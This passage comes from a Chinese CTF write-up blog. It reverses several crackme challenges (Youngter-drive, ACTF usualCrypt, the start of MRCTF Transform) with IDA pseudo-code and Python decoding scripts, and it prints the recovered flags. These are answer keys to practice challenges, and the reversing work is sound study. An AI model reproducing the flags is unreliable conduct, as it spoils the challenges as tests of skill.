<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一看就是简单的古典密码而已，直接脚本出</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"*F'\"N,\"(I?+@"</span>
dic <span class="token operator">=</span> <span class="token string">r"&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=&lt;;:9876543210/.-,+*)("</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;%$# !\""</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> dic<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;U9X_1S_W6@T?&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="buu、Youngter-drive"><a href="#buu、Youngter-drive" class="headerlink" title="buu、Youngter-drive"></a>buu、Youngter-drive</h3><p>首先给的是exe文件就先验验壳，UPX壳，直接脱了。</p>
<p>或者使用OD手工脱了，<a target="_blank" rel="noopener" href="https://blog.csdn.net/kevin66654/article/details/79135861">关于OD的手工脱壳的教程</a>。</p>
<p>然后拉入ida32简单分析。注意到创建了两个单独的线程来进行加密，两个线程的函数分别为<code>StartAddress</code>、<code>sub_41119F</code>。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    HANDLE v4<span class="token punctuation">;</span> <span class="token comment">// [esp+D0h] [ebp-14h]</span>
    HANDLE hObject<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-8h]</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sub_4110FF<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">::</span>hObject <span class="token operator">=</span> <span class="token function">CreateMutexW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">j_strcpy</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Source<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    hObject <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> StartAddress<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v4 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sub_41119F<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span> dword_418008 <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token punctuation">;</span>
    <span class="token function">sub_411190</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span><span class="token operator">::</span>hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虽然创建了两个线程，但是第二线程似乎只是为了Sleep而创建的，所以只有<code>StartAddress</code>函数是具有功能的。深入跟进该函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// positive sp value has been detected, the output may be wrong!</span>
<span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">sub_411940</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
    <span class="token keyword">char</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+D3h] [ebp-5h]</span>

    v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;</span> <span class="token number">97</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;</span> <span class="token number">65</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">97</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">122</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        result <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        result <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虽然最上面提示了堆栈不平衡，但是ida7.5依然分析出了该功能的c代码。上面的a2对应的就是那个一直在自减一的<code>dword_418008</code>，表示字符串的窗口挪动？而后面的那个线程似乎只做了字符串窗口移动的动作。这个应该是一个从后向前推导的过程，但是简单分析了一下，这样似乎不行，看了别人的wp，发现应该是后面还有一位的，这里进行验证的是29位，但是其实进行加密的是30位，这样就满足了，由此得出逆向的python脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">''</span>
off_418000 <span class="token operator">=</span> <span class="token string">'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>
off_418004 <span class="token operator">=</span> <span class="token string">'TOiZiZtOrYaToUwPnToBsOaOapsySy'</span>  <span class="token comment"># 在从ida得来的字符串的最后加上一位(随意的字符)，经测试，只有在第三十位字符是y的情况下得出的flag才是正确的</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>off_418004<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> off_418004<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        <span class="token keyword">continue</span>
    tmp <span class="token operator">=</span> off_418000<span class="token punctuation">.</span>index<span class="token punctuation">(</span>off_418004<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 用tmp的值代表检验字符串在加密表字符串的位置(下标)</span>
    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">96</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># ThisisthreadofwindowshahaIsESE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后一位是y时得到的flag才是正确的。。。</p>
<p>另外加密的时候<code>*(_BYTE *)(a2 + a1)</code>代表的是地址，所以后面的<code>*(char *)(a2 + a1)</code>应该也是地址类似的东西，在数组里面也只有下标了，总之这道题做得挺蒙的。。。</p>
<h3 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h3><p><strong>TAG:换表base64、大小写互相转换</strong></p>
<p>查壳无壳</p>
<p><img src="/2021/05/28/CTF/image-20210607180229271.png" alt></p>
<p>直接先使用ida32打开看一看</p>
<p><img src="/2021/05/28/CTF/image-20210607180359872.png" alt></p>
<p>找到关键的字符串，一路跟踪进去发现关键函数，内容如下(其实就是逆出来的main函数)</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// esi</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-74h] BYREF</span>
  __int16 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-68h]</span>
  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+16h] [ebp-66h]</span>
  <span class="token keyword">char</span> v8<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-64h] BYREF</span>

  <span class="token function">sub_403CF8</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_40E140<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">sub_401080</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">==</span> byte_40E0E4<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v3 <span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token keyword">goto</span> LABEL_6<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aError<span class="token punctuation">)</span><span class="token punctuation">;</span>
LABEL_6<span class="token operator">:</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span>byte_40E0E4<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aAreYouHappyYes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    result <span class="token operator">=</span> <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aAreYouHappyNo<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先看前面的这个函数</p>
<p><img src="/2021/05/28/CTF/image-20210607192629739.png" alt></p>
<p>跟进函数内部，很容易发现这就是一个换表的base64，原始的表为</p>
<pre class="line-numbers language-none"><code class="language-none">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注意到引用这串字符串的，有个函数专门用来换表，函数的内容如下</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// cl</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> result <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> result <span class="token operator">&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>result <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v1 <span class="token operator">=</span> byte_40E0AA<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>
    byte_40E0AA<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> byte_40E0A0<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>
    byte_40E0A0<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意到上面<code>byte_40E0A0</code>和<code>byte_40E0A0</code>交换位置，ez，意思就是对原始的表从第六位开始和原始的表的第15位开始后的9位进行调换位置即可。</p>
<p>然后就是最后的这个了，一般情况下进行base的时候应该是没有这个的，这个逆出了这个说明有问题</p>
<p><img src="/2021/05/28/CTF/image-20210607194310914.png" alt></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">sub_401030</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment">// al</span>

  v1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
      v2 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token string">'z'</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>
        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> v2 <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      a1<span class="token punctuation">[</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>
LABEL_9<span class="token operator">:</span>
      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token operator">++</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大小写相互转换，这里的逻辑大概清晰了，我们先找到加密后的flag如下</p>
<p><img src="/2021/05/28/CTF/image-20210607192901280.png" alt></p>
<p>这个应该就是flag转换后的样子，</p>
<pre class="line-numbers language-none"><code class="language-none">zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>先把这个字符串大小写互换之后进行base64的换标解密，写出完整版的poc如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> base64

s <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>
enc_flag <span class="token operator">=</span> <span class="token string">'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'</span>
encflag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> enc_flag<span class="token punctuation">:</span>
    <span class="token keyword">if</span> i<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        encflag <span class="token operator">+=</span> i<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> i<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        encflag <span class="token operator">+=</span> i<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        encflag <span class="token operator">+=</span> i
<span class="token keyword">print</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span>


<span class="token comment"># 换表base64</span>
ss <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
table<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>ss<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encflag<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;bAse64_h2s_a_Surprise&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>里面的换表的结果与原始表的排列是有关的，仔细看看那两个字符数组<code>byte_40E0A0</code>和<code>byte_40E0A0</code>就明白了。</p>
<h3 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h3><p><strong>TAG:简单异或</strong></p>
<p>首先是个exe可执行文件，先查一下是不是带壳的。</p>
<p><img src="/2021/05/28/CTF/image-20210608074332817.png" alt></p>
<p>64位无壳程序</p>
<p>拖入ida64位，找到关键函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-70h] BYREF</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-8h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8Ch] [rbp-4h]</span>

  <span class="token function">sub_402230</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Give me your code:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_40E5F0</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">33</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Wrong!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
